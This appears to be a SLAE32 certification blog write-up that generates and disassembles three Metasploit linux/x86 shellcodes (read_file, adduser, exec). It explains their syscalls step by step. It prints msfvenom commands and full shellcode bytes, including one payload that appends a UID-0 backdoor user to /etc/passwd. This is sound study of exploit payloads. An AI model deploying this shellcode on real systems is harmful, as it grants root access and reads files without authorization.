---
title: SLAE32 - Assignment 5 - Analysis
date: 2021-03-14
tags:
- SLAE32
categories:
- SLAE Exam Assignments
- SLAE 32-bit
keywords:
    - Assembly
    - Metasploit
    - Analysis
---

The fifth assigment for the SLAE32 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86 and dissect them presenting the analysis.
<!--more-->
The list of available shellcodes have been generated using the following command:
```
msfvenom --list payloads | grep linux/x86
```
## ReadFile
The first shellcode I have selected is `linux/x86/read_file`. 

First of all, we need to understand which parameters this shellcode needs:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.1-ReadFile]
└─$ msfvenom -p linux/x86/read_file -a x86 --platform linux --list-options                           
Options for payload/linux/x86/read_file:
=========================


       Name: Linux Read File
     Module: payload/linux/x86/read_file
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 62
       Rank: Normal

Provided by:
    hal

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FD    1                yes       The file descriptor to write output to
PATH                   yes       The file path to read

Description:
  Read up to 4096 bytes from the local file system and write it back 
  out to the specified file descriptor
```

I opted for `/tmp/flag.txt` as file to be read, therefore the shellcode generation is done with the following command:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.1-ReadFile]
└─$ msfvenom -p linux/x86/read_file -a x86 --platform linux -f c -o readfile.txt PATH="/tmp/flag.txt"
No encoder specified, outputting raw payload
Payload size: 75 bytes
Final size of c file: 339 bytes
Saved as: readfile.txt
```

I have then taken the shellcode and passed it to ndisasm:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.1-ReadFile]
└─$ echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x00" | ndisasm -u - > readfile_disasm.txt
```

This shellcode is a classic JMP-CALL-POP example: this technique is used to get memory address for string "/tmp/flag.txt\00" (shellcode starting at offset 0x3D).

After the JMP-CALL, several syscalls are being executed.

The first is a call to [__NR_open](https://man7.org/linux/man-pages/man2/open.2.html) (Syscall 0x5, value in EAX) popping the pointer to the string (file to be opened) into EBX and setting ECX (int flags) to zero.
```
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
```
After execution, the file descriptor for the opened file is into EAX, and it is then moved to EBX in order to perform a [__NR_read](https://man7.org/linux/man-pages/man2/read.2.html) operation (Syscall 0x3, value in EAX). The address of the top of the stack (ESP) is used as _*buf_ parameter and it is therefore copied into EDI and then into ECX. EDX is set to 4096 - 0x1000 in hex - as _count_ parameter (number of bytes to be read)
```
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
```
The return value of the syscall, stored in EAX after its execution, is the number of bytes read, which is then moved to EDX in order to perform a [__NR_write](https://man7.org/linux/man-pages/man2/write.2.html) operation (Syscall 0xd, value in EAX).
EBX contains the first parameter - _fd_ - which is set to 1 (STDOUT); ECX already contains parameter _*buf*_ from the previous syscall and EDX - copied from eax right after the _read_ syscall - contains the number of bytes read. 
```
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
```

The final action is the execution of an `exit(0)` function.
```
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
```

## AddUser
The second shellcode I have selected is `linux/x86/adduser`. 

First of all, we need to understand which parameters this shellcode needs:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.2-AddUser]
└─$ msfvenom -p linux/x86/adduser -a x86 --platform linux --list-options  
Options for payload/linux/x86/adduser:
=========================


       Name: Linux Add User
     Module: payload/linux/x86/adduser
   Platform: Linux
       Arch: x86
Needs Admin: Yes
 Total size: 97
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    vlad902 <vlad902@gmail.com>
    spoonm <spoonm@no$email.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create

Description:
  Create a new user with UID 0
```


We are good to go with the default options, therefore the shellcode generation is done with the following command:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.2-AddUser]
└─$ msfvenom -p linux/x86/adduser -a x86 --platform linux -f c -o adduser.txt
No encoder specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
Saved as: adduser.txt
```

I have then taken the shellcode and passed it to ndisasm:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.2-AddUser]
└─$ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - > adduser_disasm.txt
```

At offset 0x26 we can see a call to 0x53, the instructions between the two addresses seems to be very obscure but with a quick check it is clear that at offset 0x2B we can find a string related to the user we want to create. In order to correctly disassemble the last piece, I have taken all the shellcode from 0x53 to the end and ran a second disasm, for which the output is available in `adduser_disasm_lastpiece.txt`.

Now the shellcode is quite clear: it performs 4 syscalls in order to add the new user at the end of /etc/passwd:
![AddUser shellcode flow](/writeups/img/slae5-adduser-01.png)

The first call is to [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html), which sets real and effective user IDs of the calling process. Input parameters are set to zero, meaning an impersonation of user 'root' (which is required in order to edit /etc/passwd file).
![AddUser shellcode analysis - part 1](/writeups/img/slae5-adduser-02.png)

The second call is to [open](https://man7.org/linux/man-pages/man2/open.2.html), its purpose is to get a file descriptor to write into `/etc/passwd`. Address of the file is pushed on the stack, and 0x401 (OCT 2001) is set as file flags, meaning `O_WRONLY` (Write-only) and `O_APPEND` (new lines will be added at the end of the file).
![AddUser shellcode analysis - part 2](/writeups/img/slae5-adduser-03.png)

The result of the call is the file descriptor, which is put into EAX. The third call is a [write](https://man7.org/linux/man-pages/man2/write.2.html) to add the new user into /etc/passwd. The pointer to the string to be added is obtained with a call (offset 0x26).
![AddUser shellcode analysis - part 3](/writeups/img/slae5-adduser-04.png)

The last call is to [exit](https://man7.org/linux/man-pages/man2/exit.2.html). EBX (the exit status) is not really changed, therefore the exit status will be the file descriptor used in previous calls.
![AddUser shellcode analysis - part 4](/writeups/img/slae5-adduser-05.png)

## Exec
The third shellcode I have selected is `linux/x86/exec`. 

First of all, we need to understand which parameters this shellcode needs:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.3-Exec]
└─$ msfvenom -p linux/x86/exec -a x86 --platform linux --list-options                        
Options for payload/linux/x86/exec:
=========================


       Name: Linux Execute Command
     Module: payload/linux/x86/exec
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    vlad902 <vlad902@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command
```

I opted for `/usr/bin/whoami` as file to be read, therefore the shellcode generation is done with the following command:
```
┌──(kali㉿kali)-[~/SLAE32-Exam/5.3-Exec]
└─$ msfvenom -p linux/x86/exec -a x86 --platform linux -f c -o exec.txt CMD="/usr/bin/whoami"
No encoder specified, outputting raw payload
Payload size: 51 bytes
Final size of c file: 240 bytes
Saved as: exec.txt
```

I have then taken the shellcode and passed it to ndisasm with the same method used for the two shellcodes already described.

The code is nothing but executing an [__NR_execve](https://man7.org/linux/man-pages/man2/execve.2.html) syscall with appropriate parameters.
The pointer to the string of command to be executed (whoami) is gathered through the _call_ at offset 0x18, therefore the disasm from there on is not the real picture of the executed instructions. In order to disassemble the last piece, I have taken all the shellcode from 0x2d to the end and ran a second disasm, for which the output is available in `exec_disasm_lastpiece.txt`

In the following image, you can find a scheme of the shellcode flow, with the situation of the stack at the interrupt for the syscall.
![Exec shellcode flow](/writeups/img/slae5-exec-flow.png)

<!-- SLAE32 Disclaimer -->
_________________
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

**Student ID**: `SLAE - 1547`  
**GitHub repository**: [https://github.com/andrea-perfetti/SLAE32-Exam](https://github.com/andrea-perfetti/SLAE32-Exam)

This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:
```
┌──(kali㉿kali)-[~]
└─$ uname -a 
Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
```